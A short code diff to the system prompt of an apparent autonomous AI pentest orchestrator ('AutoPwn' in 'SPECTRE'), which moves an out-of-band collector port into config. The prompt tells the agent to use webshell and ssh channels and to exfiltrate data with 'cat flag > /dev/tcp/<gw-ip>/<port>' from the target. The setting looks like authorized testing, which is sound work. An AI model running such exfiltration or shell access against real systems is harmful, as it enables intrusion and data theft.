@@ -16,7 +16,7 @@ import * as openaiCompletions from '@earendil-works/pi-ai/api/openai-completions
 import * as anthropicMessages from '@earendil-works/pi-ai/api/anthropic-messages';
 import * as googleGenerativeAi from '@earendil-works/pi-ai/api/google-generative-ai';
 
-import { CONFIG } from './config.mjs';
+import { CONFIG, PORT_MAP } from './config.mjs';
 import { AGENTS } from './agents.mjs';
 
 /* R32D44-llm: 三线制注册表(格式 → pi-ai 实现)。 */
@@ -76,7 +76,7 @@ export const ORCHESTRATOR_PROMPT = [
   '迟到落账≠子代理失败,对账后再决定重做(假警报曾致双倍劳动);2.relay 前先查会话态,',
   '死会话不 relay;3.子代理完成通知可能抢跑,接管前等报告/DM 落库;4.已验证的 webshell/',
   'ssh 通道用 shell 工具 register 自注册进审计体系(禁 bash 裸跑绕审计);5.OOB 侧信道:',
-  '运行时宿主 19999 端口收集器可达(靶机 cat flag > /dev/tcp/<gw-ip>/19999),适合',
+  `运行时宿主 ${PORT_MAP.oobCollector} 端口收集器可达(靶机 cat flag > /dev/tcp/<gw-ip>/${PORT_MAP.oobCollector}),适合`,
  '「首读者必死」场景;6.授权边界写进派发指令的参数区,不留在散文里。',
 
   'You ARE the AutoPwn orchestrator of SPECTRE, a blackbox pentest console.',
